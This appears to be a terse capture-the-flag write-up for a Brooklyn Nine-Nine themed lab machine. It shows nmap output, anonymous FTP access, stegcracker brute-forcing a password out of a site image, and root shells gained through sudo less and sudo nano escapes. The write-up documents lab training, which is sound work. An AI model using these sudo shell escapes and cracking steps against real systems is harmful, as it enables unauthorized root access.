# Brooklyn Nine Nine

ctrl +u 
```
Have you ever heard of steganography?
```

nmap
```
┌──(root💀kali)-[/home/kali]
└─# nmap -A -T5 10.10.18.236                                                                                                         255 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-28 14:42 EDT
Nmap scan report for 10.10.18.236
Host is up (0.27s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.3.45
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Aggressive OS guesses: Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.5 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT       ADDRESS
1   293.42 ms 10.9.0.1
2   367.86 ms 10.10.18.236

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.76 seconds

```

ftp 
```
┌──(root💀kali)-[/home/kali]
└─# ftp 10.10.18.236        
Connected to 10.10.18.236.
220 (vsFTPd 3.0.3)
Name (10.10.18.236:kali): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||23054|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
229 Entering Extended Passive Mode (|||10213|)
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
100% |**********************************************************************************************|   119      113.48 KiB/s    00:00 ETA
226 Transfer complete.
119 bytes received in 00:00 (0.35 KiB/s)
ftp> exit
221 Goodbye.

```

txt
```
┌──(root💀kali)-[/home/kali]
└─# cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

```
ssh
```
┌──(root💀kali)-[/home/kali]
└─# ssh jake@10.10.18.236                                                                                                            255 ⨯
The authenticity of host '10.10.18.236 (10.10.18.236)' can't be established.
ED25519 key fingerprint is SHA256:ceqkN71gGrXeq+J5/dquPWgcPWwTmP2mBdFS2ODPZZU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.18.236' (ED25519) to the list of known hosts.
jake@10.10.18.236's password: 
Last login: Tue May 26 08:56:58 2020
jake@brookly_nine_nine:~$ ls
jake@brookly_nine_nine:~$ cd /

```
root
```
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
.
.
.
.
sudo less /etc/profile
!/bin/sh (enter)


jake@brookly_nine_nine:~$ sudo less /etc/profile
# cd /root
# ls
root.txt

```

方法2
```
<style>
body, html {
  height: 100%;
  margin: 0;
}

.bg {
  /* The image used */
  background-image: url("brooklyn99.jpg");

  /* Full height */
  height: 100%; 

  /* Center and scale the image nicely */
  background-position: center;
  background-repeat: no-repeat;
  background-size: cover;
}
</style>

```
http://10.10.18.236/brooklyn99.jpg


```
┌──(root💀kali)-[/home/kali/Downloads]
└─# steghide extract -sf brooklyn99.jpg                                                                                                1 ⨯
Enter passphrase: 


┌──(kali㉿kali)-[~/Downloads]
└─$ stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt

StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2022 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which 
will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

Counting lines in wordlist..
Attacking file 'brooklyn99.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: admin
Tried 20651 passwords
Your file has been written to: brooklyn99.jpg.out


┌──(kali㉿kali)-[~/Downloads]
└─$ cat brooklyn99.jpg.out
Holts Password:
fluffydog12@ninenine

Enjoy!!
```
root
```
┌──(kali㉿kali)-[~/Downloads]
└─$ ssh holt@10.10.18.236                                                                                                            130 ⨯
holt@10.10.18.236's password: 
Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
holt@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
holt@brookly_nine_nine:~$ ./nano -s /bin/sh
-bash: ./nano: No such file or directory
holt@brookly_nine_nine:~$ ./bin/nano -s /bin/sh
-bash: ./bin/nano: No such file or directory
holt@brookly_nine_nine:~$ sudo ./bin/nano -s /bin/sh
[sudo] password for holt: 
sudo: ./bin/nano: command not found
holt@brookly_nine_nine:~$ cd /
holt@brookly_nine_nine:/$ sudo ./bin/nano -s /bin/sh
root@brookly_nine_nine:/# id
uid=0(root) gid=0(root) groups=0(root)
root@brookly_nine_nine:/# 

```

nano suid 
```
./nano -s /bin/sh
/bin/sh
^T
```